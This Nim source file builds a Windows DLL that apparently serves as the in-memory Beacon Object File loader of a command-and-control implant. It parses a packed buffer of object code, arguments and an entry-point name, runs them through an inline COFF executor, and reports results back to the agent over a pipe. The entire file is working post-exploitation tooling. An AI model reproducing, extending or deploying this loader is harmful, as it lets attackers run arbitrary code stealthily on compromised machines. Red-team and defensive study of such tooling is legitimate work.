import winim/lean
import ./[beacon, coff]

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL
             {.stdcall, exportc, dynlib.} =
    return TRUE

proc parseArguments(args: PBYTE, argsLen: DWORD): tuple[obj: PBYTE, objLen: DWORD, objArgs: PBYTE, objArgsLen: DWORD, entryFunc: string] =
    if args == nil or argsLen < 8:
        return

    let bofLen = cast[ptr uint32](args)[]
    if argsLen < cast[DWORD](4 + bofLen + 4):
        return

    let bofArgsLen = cast[ptr uint32](cast[uint](args) + 4 + bofLen)[]
    if argsLen < cast[DWORD](4 + bofLen + 4 + bofArgsLen):
        return

    let entryFuncLen = cast[ptr uint32](cast[uint](args) + 4 + bofLen + 4 + bofArgsLen)[]
    if argsLen < cast[DWORD](4 + bofLen + 4 + bofArgsLen + 4 + entryFuncLen):
        return

    result.obj = cast[PBYTE](cast[uint](args) + 4)
    result.objLen = cast[DWORD](bofLen)
    result.objArgs = cast[PBYTE](cast[uint](args) + 4 + bofLen + 4)
    result.objArgsLen = cast[DWORD](bofArgsLen)    
    result.entryFunc = newString(entryFuncLen)
    copyMem(addr result.entryFunc[0], cast[cstring](cast[uint](args) + 4 + bofLen + 4 + bofArgsLen + 4), entryFuncLen)

proc Run(args: PBYTE, argsLen: DWORD, hWrite, hWakeup, hStop: HANDLE): BOOL {.stdcall, exportc, dynlib.} =
    NimMain()

    gOutputPipe = hWrite
    gWakeupEvent = hWakeup
    gStopEvent = hStop

    let (obj, objLen, objArgs, objArgsLen, entryFunc) = parseArguments(args, argsLen)
    try:
        inlineExecute(obj, objLen, objArgs, objArgsLen, entryFunc)
    
    except CatchableError as err:
        # Write error message to pipe and wakeup agent
        BeaconPrintf(CALLBACK_ERROR, err.msg)
        BeaconWakeup()
        return FALSE

    # Flush pipe buffer 
    BeaconWakeup()
    return TRUE
